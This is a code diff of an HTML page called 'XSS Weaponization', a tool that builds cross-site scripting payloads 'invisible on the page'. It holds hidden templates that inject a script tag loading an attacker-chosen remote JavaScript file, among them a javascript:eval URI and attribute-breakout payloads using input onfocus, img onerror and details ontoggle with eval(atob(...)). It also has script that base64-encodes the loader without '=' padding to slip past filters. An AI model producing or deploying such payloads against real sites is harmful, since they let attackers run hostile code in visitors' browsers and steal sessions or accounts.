@@ -13,138 +13,145 @@
     <textarea id="data0"
         hidden="true">var a=document.createElement('script');a.src='arr0w1';document.body.appendChild(a);</textarea>
 
-
     <textarea id="data1"
         hidden="true">javascript:eval('var a=document.createElement(\'script\');a.src=\'arr0w1\';document.body.appendChild(a)')</textarea>
 
-    <textarea id="data2" hidden="true">"><input onfocus=eval(atob(this.id)) id=arr0w1_base64 autofocus><x id="</textarea>
+    <textarea id="data2"
+        hidden="true">"><input onfocus=eval(atob(this.id)) id=arr0w1_base64 autofocus><x id="</textarea>
 
-    <textarea id="data3" hidden="true">"><img src id=arr0w1_base64 onerror=eval(atob(this.id))><x id="</textarea>
+    <textarea id="data3"
+        hidden="true">"><img src id=arr0w1_base64 onerror=eval(atob(this.id))><x id="</textarea>
 
-    <textarea id="data4" hidden="true">"><details open ontoggle="arr0w1_on_event_js" style="display: none"><x id="</textarea>
+    <textarea id="data4"
+        hidden="true">"><details open ontoggle="arr0w1_on_event_js" style="display: none"><x id="</textarea>
 
+    <main role="main">
+        <section class="jumbotron text-center g-light">
+            <div class="container">
+                <h1>XSS Weaponization</h1>
+                <p class="lead text-muted">Generate weaponized payloads that are invisible on the page.</p>
+            </div>
+            <br>
 
-    <div class="container-sm">
-
-        <div class="col-md-10">
-            <h1>XSS Weaponization</h1>
             <p class="font-weight-bold">The path to your JavaScript file:</p>
             <input type="text" id="your_url_path" value="https://xss.com/demo.js" oninput="func_oninput()"
-                class="form-control text-white bg-dark">
-            </br>
+                class="form-control text-white bg-dark" autofocus
+                onfocus="var temp_value=this.value; this.value=''; this.value=temp_value" />
 
-            <hr> <!-- -->
+            <br>
+
+            <hr> <!-- ---------- -->
             0
             <p class="font-weight-bold">JavaScript_content </p>
             <textarea autofocus id="payload0" placeholder="" class="form-control" rows="3"></textarea>
 
-            <hr> <!-- -->
-
+            <br>
+            <br>
             1
-            <p class="font-weight-bold">eval(JavaScript_content)</p>
+            <p class="font-weight-bold">eval(JavaScript_content) </p>
             <textarea autofocus id="payload1" placeholder="" class="form-control" rows="3"></textarea>
 
             <br>
             <br>
             2
-            <p class="font-weight-bold">Tag</p>
+            <p class="font-weight-bold">Tag - input </p>
             <textarea autofocus id="payload2" placeholder="" class="form-control" rows="3"></textarea>
 
             <br>
             <br>
             3
-            <p class="font-weight-bold">Tag - input </p>
+            <p class="font-weight-bold">Tag - img </p>
             <textarea autofocus id="payload3" placeholder="" class="form-control" rows="3"></textarea>
 
             <br>
             <br>
             4
-            <p class="font-weight-bold">Tag - img</p>
+            <p class="font-weight-bold">Tag - detail </p>
             <textarea autofocus id="payload4" placeholder="" class="form-control" rows="3"></textarea>
 
-        </div>
-    </div>
+        </section>
+    </main>
 
 </body>
 
 
 <script>
 
-        // -----
+    // -----
 
-        // get elements - hiddened
-        element_data0 = document.getElementById("data0");
-        element_data1 = document.getElementById("data1");
-        element_data2 = document.getElementById("data2");
-        element_data3 = document.getElementById("data3");
-        element_data4 = document.getElementById("data4");
+    // get elements - hiddened
+    element_data0 = document.getElementById("data0");
+    element_data1 = document.getElementById("data1");
+    element_data2 = document.getElementById("data2");
+    element_data3 = document.getElementById("data3");
+    element_data4 = document.getElementById("data4");
 
-        // get datas
-        var data0 = element_data0.value;
-        var data1 = element_data1.value;
-        var data2 = element_data2.value;
-        var data3 = element_data3.value;
-        var data4 = element_data4.value;
+    // get datas
+    var data0 = element_data0.value;
+    var data1 = element_data1.value;
+    var data2 = element_data2.value;
+    var data3 = element_data3.value;
+    var data4 = element_data4.value;
 
-        // -----
+    // -----
 
-        //textarea增高 随内容自动增加textarea的高度
-        function auto_grow(element) {
-            element.style.height = "5px";
-            element.style.height = (element.scrollHeight) + "px";
-        }
+    //textarea增高 随内容自动增加textarea的高度
+    function auto_grow(element) {
+        element.style.height = "5px";
+        element.style.height = (element.scrollHeight) + "px";
+    }
 
-        // -----
-        // get elements - showed
-        // element_payload0 = document.getElementById("payload0");
-        // element_payload1 = document.getElementById("payload1");
-        // element_payload2 = document.getElementById("payload2");
-        // element_payload3 = document.getElementById("payload3");
-        // element_payload4 = document.getElementById("payload4");
+    // -----
+    // get elements - showed
+    // element_payload0 = document.getElementById("payload0");
+    // element_payload1 = document.getElementById("payload1");
+    // element_payload2 = document.getElementById("payload2");
+    // element_payload3 = document.getElementById("payload3");
+    // element_payload4 = document.getElementById("payload4");
 
-        // -----
+    // -----
 
-        // 生成不带=的base64字符串
-        function func_wise_btoa(str1) {
-            //原理:在原始js语句后加空格 直到生成的base64字符串没有空格
-            while (1) {
-                if (btoa(str1).indexOf("=") == -1) {//  等号不存在
-                    return btoa(str1);
-                } else {
-                    str1 = str1 + " ";
-                }
-
+    // 生成不带=的base64字符串
+    function func_wise_btoa(str1) {
+        //原理:在原始js语句后加空格 直到生成的base64字符串没有空格
+        while (1) {
+            if (btoa(str1).indexOf("=") == -1) {//  等号不存在
+                return btoa(str1);
+            } else {
+                str1 = str1 + " ";
             }
+
         }
+    }
 
-        var func_oninput = function () {
+    var func_oninput = function () {
 
-            var your_url_path = document.getElementById("your_url_path").value;
+        var your_url_path = document.getElementById("your_url_path").value;
 
-            var js_code_append_a_script_tag_with_url_path = document.getElementById("data0").value.replace("arr0w1", your_url_path)
+        var js_code_append_a_script_tag_with_url_path = document.getElementById("data0").value.replace("arr0w1", your_url_path)
 
-            var js_code_append_a_script_tag_btoa_ed = func_wise_btoa(js_code_append_a_script_tag_with_url_path);
+        var js_code_append_a_script_tag_btoa_ed = func_wise_btoa(js_code_append_a_script_tag_with_url_path);
 
-            document.getElementById("payload0").value = js_code_append_a_script_tag_with_url_path;
+        document.getElementById("payload0").value = js_code_append_a_script_tag_with_url_path;
 
-            document.getElementById("payload1").value = data1.replace("arr0w1", your_url_path);
+        document.getElementById("payload1").value = data1.replace("arr0w1", your_url_path);
 
-            document.getElementById("payload2").value = data2.replace("arr0w1_base64", js_code_append_a_script_tag_btoa_ed);
+        document.getElementById("payload2").value = data2.replace("arr0w1_base64", js_code_append_a_script_tag_btoa_ed);
 
-            document.getElementById("payload3").value = data3.replace("arr0w1_base64", js_code_append_a_script_tag_btoa_ed);
+        document.getElementById("payload3").value = data3.replace("arr0w1_base64", js_code_append_a_script_tag_btoa_ed);
 
-            document.getElementById("payload4").value = data4.replace("arr0w1_on_event_js", js_code_append_a_script_tag_with_url_path);
+        document.getElementById("payload4").value = data4.replace("arr0w1_on_event_js", js_code_append_a_script_tag_with_url_path);
 
-            auto_grow(document.getElementById("payload0"));
-            auto_grow(document.getElementById("payload1"));
-            auto_grow(document.getElementById("payload2"));
-            auto_grow(document.getElementById("payload3"));
-            auto_grow(document.getElementById("payload4"));
-        }
+        auto_grow(document.getElementById("payload0"));
+        auto_grow(document.getElementById("payload1"));
+        auto_grow(document.getElementById("payload2"));
+        auto_grow(document.getElementById("payload3"));
+        auto_grow(document.getElementById("payload4"));
+    }
 
     // -----
 
     func_oninput();
-    </script>
+</script>
 
 </html>
